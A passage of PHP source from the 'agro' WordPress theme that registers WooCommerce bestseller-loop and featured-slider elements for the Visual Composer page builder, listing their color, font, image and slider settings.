                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'post_spacer',
                'heading' => esc_html__('Post Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'catclr',
                'heading' => esc_html__('Category color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ptclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'pthclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dclr',
                'heading' => esc_html__('Excerpt color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'datebg',
                'heading' => esc_html__('Date background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'dateclr',
                'heading' => esc_html__('Day color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'mounthclr',
                'heading' => esc_html__('Mounth color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'contentbg',
                'heading' => esc_html__('Text content background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-1',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr5',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr6',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro'),
            )
        )));
    }
}


/*******************************/
/* Blog Post Loop
/******************************/
if (!function_exists('agro_woo_bestseller_integrateWithVC')) {
    add_action('vc_before_init', 'agro_woo_bestseller_integrateWithVC');
    function agro_woo_bestseller_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Woo Bestseller Loop', 'agro'),
        'base' => 'agro_woo_bestseller',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Post Style', 'agro'),
                'param_name' => 'style',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Style 1', 'agro') => '1',
                    esc_html__('Style 2', 'agro') => '2',
                )
            ),
            array(
                "type" => "loop",
                "heading" => esc_html__("Post Query", 'agro'),
                "param_name" => "build_query",
                'settings' => array(
                'size' => array( 'hidden' => false, 'value' =>  '' ),
                'order_by' => array( 'value' => 'date' ),
                'post_type' => array( 'value' => 'product', 'hidden' => false)
                ),
                "description" 	=> esc_html__("Create WordPress loop, to populate products from your site.", 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spt',
                'heading' => esc_html__('Section Top Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-top will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spb',
                'heading' => esc_html__('Section Bottom Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-bottom will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            // Post thumb
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Post Image Width', 'agro'),
                'description' => esc_html__('Change post thumbnail image width or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Post Image Height', 'agro'),
                'description' => esc_html__('Change post thumbnail image height or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'fullthumb',
                'heading' => esc_html__('Full Image Size', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the post thumbnail image will be not cropped.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'post_spacer',
                'heading' => esc_html__('Post Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ptclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'pthclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'starclr',
                'heading' => esc_html__('Star color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discbg',
                'heading' => esc_html__('Discount background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discclr',
                'heading' => esc_html__('Discount color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr',
                'heading' => esc_html__('Price sale color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr2',
                'heading' => esc_html__('Price regular color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr5',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr6',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro'),
            )
        )));
    }
}


/*******************************/
/* Blog Post Loop
/******************************/
if (!function_exists('agro_woo_featured_integrateWithVC')) {
    add_action('vc_before_init', 'agro_woo_featured_integrateWithVC');
    function agro_woo_featured_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Woo Featured Slider', 'agro'),
        'base' => 'agro_woo_featured',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                "type" => "loop",
                "heading" => esc_html__("Post Query", 'agro'),
                "param_name" => "build_query",
                'settings' => array(
                'size' => array( 'hidden' => false, 'value' =>  '' ),
                'order_by' => array( 'value' => 'date' ),
                'post_type' => array( 'value' => 'product', 'hidden' => false)
                ),
                "description" 	=> esc_html__("Create WordPress loop, to populate products from your site.", 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spt',
                'heading' => esc_html__('Section Top Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-top will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'spb',
                'heading' => esc_html__('Section Bottom Spacing?', 'agro'),
                'value' => array( esc_html__('Hide', 'agro') => 'hide' ),
                'description' => esc_html__('If checked, the section padding-bottom will be disabled.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Parallax Image', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'pimg',
                        'heading' => esc_html__('Image', 'agro'),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'width',
                        'heading' => esc_html__('Image width', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit).', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'height',
                        'heading' => esc_html__('Image height', 'agro'),
                        'description' => esc_html__('Use simple number without ( px or unit).', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'xpos',
                        'heading' => esc_html__('X axis position', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'ypos',
                        'heading' => esc_html__('Y axis position', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    )
                )
            ),
            // Post thumb
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Post Image Width', 'agro'),
                'description' => esc_html__('Change post thumbnail image width or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Post Image Height', 'agro'),
                'description' => esc_html__('Change post thumbnail image height or leave it blank.Note: use simple number without px or unit.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'fullthumb',
                'heading' => esc_html__('Full Image Size', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the post thumbnail image will be not cropped.', 'agro'),
                'group' => esc_html__('Post Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_spacer',
                'heading' => esc_html__('Slider General Options', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'speed',
                'heading' => esc_html__('Speed', 'agro'),
                'description' => esc_html__('Use simple number.Default 1200', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'autoplay',
                'heading' => esc_html__('Autoplay?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'dots',
                'heading' => esc_html__('Dots?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'textfield',
                'param_name' => 'rows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'show',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'scroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_lg_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 1199px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 4', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_md_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 991px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 4', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'mdscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_sm_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 767px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 3', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'smscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 3', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // slider options
            array(
                'type' => 'nt_spacer',
                'param_name' => 'slider_xs_spacer',
                'heading' => esc_html__('Slider Responsive Options ( 575px )', 'agro'),
                'group' => esc_html__('Slider', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xsrows',
                'heading' => esc_html__('Rows', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xsshow',
                'heading' => esc_html__('Slides To Show', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'xsscroll',
                'heading' => esc_html__('Slides To Scroll', 'agro'),
                'description' => esc_html__('Use simple number.Default 2', 'agro'),
                'group' => esc_html__('Slider', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'post_spacer',
                'heading' => esc_html__('Post Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'ptclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'pthclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'starclr',
                'heading' => esc_html__('Star color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discbg',
                'heading' => esc_html__('Discount background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'discclr',
                'heading' => esc_html__('Discount color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr',
                'heading' => esc_html__('Price sale color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'priceclr2',
                'heading' => esc_html__('Price regular color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
